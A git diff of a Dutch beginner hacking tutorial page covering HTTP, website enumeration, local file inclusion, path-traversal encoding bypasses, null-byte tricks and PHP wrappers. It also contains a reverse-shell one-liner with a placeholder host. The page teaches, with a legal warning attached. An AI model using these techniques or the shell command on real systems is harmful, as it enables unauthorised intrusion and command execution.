@@ -296,11 +296,11 @@ img {
 <p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
 <p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
 <p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction.</p>
-<p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel 138ab wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
+<p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel <a href="http://wetten.overheid.nl/jci1.3:c:BWBR0001854&amp;boek=Tweede&amp;titeldeel=V&amp;artikel=138ab">138ab</a> wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
 <h1>Protocollen</h1>
 <p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
 <h2>HTTP</h2>
-<p>Het HTTP protocol1 is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
+<p>Het <a href="https://tools.ietf.org/html/rfc7230">HTTP protocol</a> is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
 Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:</p>
 <pre><code>GET /index.php HTTP/1.1
 User-Agent: Firefox
@@ -321,9 +321,9 @@ Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
 </code></pre>
 
 <p>Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:</p>
-<p><strong>POST</strong>, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.
-<strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.
-<strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
+<p><strong>POST</strong>, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.</p>
+<p><strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.</p>
+<p><strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
 Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
 <h2>FTP</h2>
 <h2>ICMP</h2>
@@ -394,8 +394,8 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <h2>Enumeratie</h2>
 <p>Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.</p>
 <h3>Zoekmachinefuncties</h3>
-<p>Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd robots.txt1 bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.</p>
-<p>Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de sitemap1. In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.</p>
+<p>Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd <a href="http://www.robotstxt.org/">robots.txt</a> bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.</p>
+<p>Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de <a href="https://en.wikipedia.org/wiki/Site_map">sitemap</a>. In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.</p>
 <h3>Webpagina's</h3>
 <p>Als je niet weet welke mappen of bestanden er allemaal bestaan kan je bij bekende softwarepakketten de installatiebestanden downloaden en deze installeren. Op deze manier kan je een beeld krijgen welke pagina’s er allemaal in een installatie horen te zitten en kan je er achter komen of er iets als een changelog (publiek) beschikbaar is waarmee je de versie van een applicatie kan achterhalen.</p>
 <h3>Dynamische pagina's</h3>
@@ -441,7 +441,7 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <p>File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.</p>
 <h2>Path traversal</h2>
 <p>Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.</p>
-<p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies include en requre ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
+<p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies <a href="https://www.php.net/include">include</a> en <a href="https://www.php.net/require">require</a> ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
 <p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path's op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. </p>
 <p>Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:</p>
 <pre><code>../
@@ -466,19 +466,16 @@ Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs t
 <p>PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. </p>
 <h3>Simpele beveiliging</h3>
 <p>In sommige gevallen proberen developers een local file inclusion te voorkomen door bijvoorbeeld een extensie op te geven in hun include. Op deze manier kunnen ze voorkomen dat je bijvoorbeeld /etc/passwd uit kan lezen, omdat /etc/passwd.php niet bestaat.</p>
-<p>In programmeertalen worden strings meestal beëindigd met een zogenaamde null-byte. Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. </p>
+<p>In programmeertalen worden strings meestal beëindigd met een zogenaamde <a href="https://en.wikipedia.org/wiki/Null_character">null-byte</a>. Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. </p>
 <p>Als het je niet lukte dan kan dit komen omdat je je URL niet correct ge-encode hebt. Een nullbyte kan je niet zomaar meesturen, maar moet door de webserver wel correct geïnterpreteerd worden. Stuur dus %00 mee in plaats van 0x00 of 0. De nullbyte methode werkt enkel in PHP &lt; 5.3.</p>
 <p>In filesystem functies trunct PHP onder linux de paden automatisch naar 4096 tekens. Je kan dit voor elkaar krijgen door voor het path een opstapeling van “./” strings op te nemen totdat je op dit maximum zit.</p>
 <h3>PHP Wrapper</h3>
-<p>PHP kent verschillende wrappers. Met PHP Wrappers kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file<em>get</em>contents te werken. </p>
+<p>PHP kent verschillende wrappers. Met <a href="http://php.net/manual/en/wrappers.php.php">PHP Wrappers</a> kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file<em>get</em>contents te werken. </p>
 <h4>php://data</h4>
 <h4>php://stdin, php://stdout en php://stderr</h4>
 <h4>php://input</h4>
-<p>De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.
-Wij gebruiken voor de volgende opdracht het php bestand “oefening1.php”.</p>
-<p>Installeer vervolgens de Firefox Hackbar op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en voornoemde pagina met als url: <jeurl>/oefening1.php?file=php://input</p>
-<p><strong>Opdracht 1:</strong> Vraag de directory listing op van /var/www/html.</p>
-<p><strong>Opdracht 2:</strong> Vraag de inhoud op van het /etc/passwd bestand.</p>
+<p>De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.</p>
+<p>Installeer vervolgens de Firefox <a href="https://addons.mozilla.org/nl/firefox/addon/hackbar/">Hackbar</a> op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en pagina.php met als url: <jeurl>/pagina.php?file=php://input</p>
 <h4>php://output</h4>
 <h4>php://fd</h4>
 <h4>php://memory en php://temp</h4>
